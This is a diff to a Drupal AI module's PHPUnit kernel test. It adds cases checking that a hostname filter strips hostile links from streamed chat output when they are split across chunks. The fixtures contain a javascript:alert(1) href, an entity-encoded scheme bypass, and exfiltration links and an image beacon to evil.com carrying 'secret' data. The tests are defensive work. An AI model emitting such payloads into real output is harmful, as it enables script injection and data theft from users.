@@ -4,14 +4,16 @@ declare(strict_types=1);
 
 namespace Drupal\Tests\ai\Kernel\Service;
 
+use Drupal\ai_test\Mock\MockIterator;
+use Drupal\ai_test\Mock\MockStreamedChatIterator;
 use Drupal\KernelTests\KernelTestBase;
-use Drupal\Tests\ai\Mock\MockIterator;
-use Drupal\Tests\ai\Mock\MockStreamedChatIterator;
+use PHPUnit\Framework\Attributes\RunTestsInSeparateProcesses;
 
 /**
  * @coversDefaultClass \Drupal\ai\Service\HostnameFilter
  * @group ai
  */
+#[RunTestsInSeparateProcesses]
 class HostnameFilterTest extends KernelTestBase {
 
   /**
@@ -256,6 +258,124 @@ class HostnameFilterTest extends KernelTestBase {
     }
     // Full link should no exist.
     $this->assertStringNotContainsString($full_link, $collected);
+  }
+
+  /**
+   * Tests a javascript: href split across stream chunks is filtered.
+   */
+  public function testChatStreamFiltersJavascriptHref(): void {
+    $this->config('ai.settings')->set('allowed_hosts', ['example.com'])->save();
+    $stream = [
+      '<p>Read ',
+      '<a href="java',
+      'script:alert(1)">click here</a>',
+      ' then visit ',
+      '<a href="https://exa',
+      'mple.com/guide">home</a>.</p>',
+      '',
+    ];
+    $collected = $this->collectStream($stream);
+    $this->assertStringNotContainsString('javascript:', $collected);
+    $this->assertStringContainsString('click here', $collected);
+    $this->assertStringContainsString('https://example.com/guide', $collected);
+  }
+
+  /**
+   * Tests entity-encoded whitespace in a scheme is filtered when streamed.
+   */
+  public function testChatStreamFiltersEntityEncodedScheme(): void {
+    $this->config('ai.settings')->set('allowed_hosts', ['example.com'])->save();
+    $stream = [
+      '<p>',
+      '<a href="java',
+      '&#9;',
+      'script:alert(1)">x</a>',
+      '</p>',
+      '',
+    ];
+    $collected = $this->collectStream($stream);
+    $this->assertStringNotContainsString('script:alert(1)', $collected);
+    $this->assertStringContainsString('x', $collected);
+  }
+
+  /**
+   * Tests a disallowed-host image beacon split across chunks is filtered.
+   */
+  public function testChatStreamFiltersDisallowedHostImageBeacon(): void {
+    $this->config('ai.settings')->set('allowed_hosts', ['example.com'])->save();
+    $stream = [
+      '<p>pixel</p>',
+      '<img src="https://e',
+      'vil.com/track.gif?d=secret">',
+      '<img src="https://exa',
+      'mple.com/ok.png">',
+      '',
+    ];
+    $collected = $this->collectStream($stream);
+    $this->assertStringNotContainsString('evil.com', $collected);
+    $this->assertStringContainsString('https://example.com/ok.png', $collected);
+  }
+
+  /**
+   * Tests an angle-bracket reference definition split across chunks is filter.
+   *
+   * CommonMark allows the destination of a reference definition to be wrapped
+   * in angle brackets ("[ref]: <url>"). The brackets must be stripped before
+   * the host check; here the destination is also split across stream chunks so
+   * the URL-safety buffer has to reassemble the full line before filtering.
+   */
+  public function testChatStreamFiltersAngleBracketReferenceDefinition(): void {
+    $this->config('ai.settings')->set('allowed_hosts', ['example.com'])->save();
+    $stream = [
+      "Read [the guide][ref].\n",
+      "\n",
+      "[ref]: <https://ev",
+      "il.com/steal>\n",
+      '',
+    ];
+    $collected = $this->collectStream($stream);
+    $this->assertStringNotContainsString('evil.com', $collected);
+    $this->assertStringContainsString('the guide', $collected);
+  }
+
+  /**
+   * Tests an angle-bracket protocol-relative reference definition is filtered.
+   *
+   * The autolink pass cannot catch this form (it requires a scheme), so the
+   * reference-definition handler must strip the brackets and apply the host
+   * allowlist itself — verified here across stream chunk boundaries.
+   */
+  public function testChatStreamFiltersAngleBracketProtocolRelativeReference(): void {
+    $this->config('ai.settings')->set('allowed_hosts', ['example.com'])->save();
+    $stream = [
+      "Read [the guide][ref].\n",
+      "\n",
+      "[ref]: <//ev",
+      "il.com/steal>\n",
+      '',
+    ];
+    $collected = $this->collectStream($stream);
+    $this->assertStringNotContainsString('evil.com', $collected);
+    $this->assertStringContainsString('the guide', $collected);
+  }
+
+  /**
+   * Streams the given chunks through the iterator and returns collected text.
+   *
+   * @param string[] $stream
+   *   The ordered output chunks to emit.
+   *
+   * @return string
+   *   The concatenated, filtered text the consumer receives.
+   */
+  protected function collectStream(array $stream): string {
+    $message = new MockStreamedChatIterator(new MockIterator($stream));
+    $collected = '';
+    foreach ($message as $part) {
+      $this->assertIsString($part->getText());
+      $collected .= $part->getText();
+    }
+    return $collected;
   }
 
   /**
